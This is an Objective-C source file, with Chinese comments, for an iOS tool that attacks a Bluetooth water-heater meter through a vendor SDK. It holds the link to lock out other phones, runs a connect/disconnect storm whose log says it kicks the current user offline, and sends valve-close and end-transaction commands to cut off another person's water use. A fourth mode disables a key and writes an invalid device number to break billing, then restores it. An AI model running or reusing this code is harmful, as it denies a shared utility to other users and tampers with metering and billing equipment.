//
//  TakeoverRunner.m
//  热水器蓝牙 —— 连接抢占 / 强制中断（实现）
//

#import "TakeoverRunner.h"
#import "KRWMCrypto.h"
#import <QZNOSDK/KRWaterMeterKit.h>

@interface KRTakeoverRunner ()
@property (nonatomic, assign, readwrite) BOOL running;
@property (nonatomic, assign) BOOL stopRequested;
@property (nonatomic, strong) CBPeripheral *peripheral;
@property (nonatomic, copy) void (^logBlock)(NSString *line);
@end

@implementation KRTakeoverRunner

- (void)log:(NSString *)line {
    if (self.logBlock && line) {
        dispatch_async(dispatch_get_main_queue(), ^{ self.logBlock(line); });
    }
}

- (void)stop {
    self.stopRequested = YES;
    self.running = NO;
    [self log:@"⏹ 已请求停止，当前步骤结束后退出"];
}

#pragma mark - 1 长连接占用

- (void)startHoldWithPeripheral:(CBPeripheral *)peripheral
                       duration:(NSTimeInterval)duration
                       interval:(NSTimeInterval)interval
                            log:(void (^)(NSString *))log
                     completion:(void (^)(BOOL, NSString *))completion {
    if (self.running) { if (completion) completion(NO, @"已有中断任务在跑"); return; }
    self.running = YES;
    self.stopRequested = NO;
    self.peripheral = peripheral;
    self.logBlock = log;
    if (interval < 0.5) interval = 2.0;

    [self log:@"========== 抢占：长连接占用 =========="];
    [self log:@"水控表单连接，占住链路期间其他手机无法连接"];
    [self log:[NSString stringWithFormat:@"时长 %.0fs，心跳 %.1fs/次",
               duration, interval]];

    KRWMCore *core = [KRWMCore sharedCore];
    __block NSInteger beats = 0;
    __block NSTimeInterval elapsed = 0;

    __block void (^tick)(void);
    __weak typeof(self) ws = self;
    tick = ^{
        if (ws.stopRequested) {
            ws.running = NO;
            [ws log:[NSString stringWithFormat:@"✅ 占用结束，共 %ld 次心跳", (long)beats]];
            if (completion) completion(YES, [NSString stringWithFormat:@"心跳 %ld 次", (long)beats]);
            return;
        }
        [core krGetStateOfDevice:^(KRSyncType t, NSData *d, NSString *orig) {
            if (d.length >= 32) {
                const uint8_t *b = d.bytes;
                uint8_t st = b[28];
                [ws log:[NSString stringWithFormat:@"心跳#%ld  state=%u  random=%@",
                         (long)beats + 1, st,
                         [KRWMCrypto hexFromData:[d subdataWithRange:NSMakeRange(24, 4)]]]];
            }
        } result:^(KRSyncType t, KRSyncResponseState s) {
            beats += 1;
            elapsed += interval;
            if (duration > 0 && elapsed >= duration) {
                ws.running = NO;
                [ws log:[NSString stringWithFormat:@"✅ 占用满 %.0fs，共 %ld 次心跳", duration, (long)beats]];
                if (completion) completion(YES, [NSString stringWithFormat:@"心跳 %ld 次", (long)beats]);
                return;
            }
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(interval * NSEC_PER_SEC)),
                           dispatch_get_main_queue(), tick);
        }];
    };
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), tick);
}

#pragma mark - 2 连接风暴

- (void)startKickWithPeripheral:(CBPeripheral *)peripheral
                         rounds:(NSInteger)rounds
                          dwell:(NSTimeInterval)dwell
                            gap:(NSTimeInterval)gap
                            log:(void (^)(NSString *))log
                     completion:(void (^)(NSInteger, NSInteger))completion {
    if (self.running) { if (completion) completion(0, rounds); return; }
    self.running = YES;
    self.stopRequested = NO;
    self.peripheral = peripheral;
    self.logBlock = log;
    if (rounds < 1) rounds = 6;
    if (dwell < 0.03) dwell = 0.08;
    if (gap < 0.05) gap = 0.2;

    [self log:@"========== 踢线：连接风暴 =========="];
    [self log:[NSString stringWithFormat:@"%ld 轮，每轮 connect→%.2fs→disconnect，间隔 %.2fs",
               (long)rounds, dwell, gap]];
    [self log:@"效果：把当前占用设备的那台手机挤下线"];

    KRWMCore *core = [KRWMCore sharedCore];
    __block NSInteger n = 0;
    __block NSInteger ok = 0;

    __block void (^round)(void);
    __weak typeof(self) ws = self;
    round = ^{
        if (ws.stopRequested || n >= rounds) {
            ws.running = NO;
            [ws log:[NSString stringWithFormat:@"✅ 风暴结束：%ld/%ld 轮成功", (long)ok, (long)rounds]];
            if (completion) completion(ok, rounds);
            return;
        }
        n += 1;
        NSInteger idx = n;
        [ws log:[NSString stringWithFormat:@"  第 %ld/%ld 轮：connect", (long)idx, (long)rounds]];
        [core connectPeripheral:ws.peripheral];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(dwell * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            BOOL conn = [core isConnected];
            if (conn) ok += 1;
            [ws log:[NSString stringWithFormat:@"  第 %ld 轮：%@ → disconnect",
                     (long)idx, conn ? @"已连上" : @"未连上"]];
            [core disconnect];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(gap * NSEC_PER_SEC)),
                           dispatch_get_main_queue(), round);
        });
    };
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), round);
}

#pragma mark - 3 关阀 / 结束交易

- (void)startValveBreakWithLog:(void (^)(NSString *))log
                    completion:(void (^)(BOOL, NSString *))completion {
    if (self.running) { if (completion) completion(NO, @"已有中断任务在跑"); return; }
    self.running = YES;
    self.stopRequested = NO;
    self.logBlock = log;

    [self log:@"========== 关阀中断 =========="];
    [self log:@"依次发 0x22 关阀 / 0x32 结束交易，切断对方正在进行的用水"];

    KRWMCore *core = [KRWMCore sharedCore];
    __block NSMutableArray<NSString *> *lines = [NSMutableArray array];

    [core KrStopUsingWater:^(KRSyncType t, NSData *d, NSString *orig) {
        [lines addObject:[NSString stringWithFormat:@"0x22 响应 %@", [KRWMCrypto hexFromData:d]]];
    } result:^(KRSyncType t, KRSyncResponseState s) {
        [self log:[NSString stringWithFormat:@"  0x22 关阀 → %@",
                   s == KRSyncResponseStateSuccess ? @"确认" : [NSString stringWithFormat:@"状态 %ld", (long)s]]];

        [core krEndTransactionMAXType:@0 MINType:@1
            dataCallback:^(KRSyncType t2, NSData *d2, NSString *orig2) {
                [lines addObject:[NSString stringWithFormat:@"0x32 响应 %@", [KRWMCrypto hexFromData:d2]]];
            } result:^(KRSyncType t2, KRSyncResponseState s2) {
                [self log:[NSString stringWithFormat:@"  0x32 结束交易 → %@",
                           s2 == KRSyncResponseStateSuccess ? @"确认" : [NSString stringWithFormat:@"状态 %ld", (long)s2]]];
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)),
                               dispatch_get_main_queue(), ^{
                    [core krGetStateOfDevice:^(KRSyncType t3, NSData *d3, NSString *orig3) {
                        if (d3.length >= 32) {
                            uint8_t st = ((const uint8_t *)d3.bytes)[28];
                            [self log:[NSString stringWithFormat:@"  复查 state=%u（0 空闲 / 1 使用中 / 3 待采集）", st]];
                        }
                    } result:^(KRSyncType t3, KRSyncResponseState s3) {
                        BOOL ok = (s == KRSyncResponseStateSuccess);
                        self.running = NO;
                        if (completion) completion(ok, [lines componentsJoinedByString:@" / "]);
                    }];
                });
            }];
    }];
}

#pragma mark - 4 配置层中断

- (void)startConfigBreakWithLog:(void (^)(NSString *))log
                     completion:(void (^)(BOOL, NSString *))completion {
    if (self.running) { if (completion) completion(NO, @"已有中断任务在跑"); return; }
    self.running = YES;
    self.stopRequested = NO;
    self.logBlock = log;

    [self log:@"========== 配置层中断 =========="];
    [self log:@"0x88 禁用密钥 → 0x19 清项目 → 0x20 写无效编号"];
    [self log:@"效果：对方下费率包会回 81 09，台账查询也会失败"];
    [self log:@"跑完自动复原（0x88 启用 + 0x20 回 3613/891）"];

    KRWMCore *core = [KRWMCore sharedCore];
    __block NSMutableString *summary = [NSMutableString string];

    // 0x88 禁用 keyNo=0
    [core krDisableKeyNo:@0 type:@1
        dataCallback:^(KRSyncType t, NSData *d, NSString *orig) {
            [summary appendFormat:@"0x88→%@ ", [KRWMCrypto hexFromData:d]];
        } result:^(KRSyncType t, KRSyncResponseState s) {
        [self log:[NSString stringWithFormat:@"  0x88 禁用密钥 → %ld", (long)s]];

        // 0x19 清除项目信息
        [core krClearNumOfDevice:^(KRSyncType t2, NSData *d2, NSString *orig2) {
            [summary appendFormat:@"0x19→%@ ", [KRWMCrypto hexFromData:d2]];
        } result:^(KRSyncType t2, KRSyncResponseState s2) {
            [self log:[NSString stringWithFormat:@"  0x19 清项目 → %ld", (long)s2]];

            // 0x20 写无效编号（productId=1 deviceId=1）
            [core krAssignNumForDevice:@1 productId:@1
                dataCallback:^(KRSyncType t3, NSData *d3, NSString *orig3) {
                    [summary appendFormat:@"0x20→%@ ", [KRWMCrypto hexFromData:d3]];
                } result:^(KRSyncType t3, KRSyncResponseState s3) {
                [self log:[NSString stringWithFormat:@"  0x20 写无效编号 → %ld", (long)s3]];

                // 复原：0x88 启用 + 0x20 回 3613/891
                [core krDisableKeyNo:@0 type:@0
                    dataCallback:nil result:^(KRSyncType t4, KRSyncResponseState s4) {
                    [self log:@"  复原 0x88 启用密钥"];
                    [core krAssignNumForDevice:@3613 productId:@891
                        dataCallback:nil result:^(KRSyncType t5, KRSyncResponseState s5) {
                        [self log:@"  复原 0x20 编号 3613/891"];
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)),
                                       dispatch_get_main_queue(), ^{
                            [core krGetStateOfDevice:^(KRSyncType t6, NSData *d6, NSString *orig6) {
                                if (d6.length >= 32) {
                                    const uint8_t *b = d6.bytes;
                                    uint32_t pid = ((uint32_t)b[1] << 24) | ((uint32_t)b[2] << 16)
                                                 | ((uint32_t)b[3] << 8) | b[4];
                                    uint32_t did = ((uint32_t)b[5] << 24) | ((uint32_t)b[6] << 16)
                                                 | ((uint32_t)b[7] << 8) | b[8];
                                    [self log:[NSString stringWithFormat:
                                               @"  复查 productId=%u deviceId=%u", pid, did]];
                                }
                            } result:^(KRSyncType t6, KRSyncResponseState s6) {
                                BOOL ok = (s == KRSyncResponseStateSuccess);
                                self.running = NO;
                                if (completion) completion(ok, summary);
                            }];
                        });
                    }];
                }];
            }];
        }];
    }];
}

@end
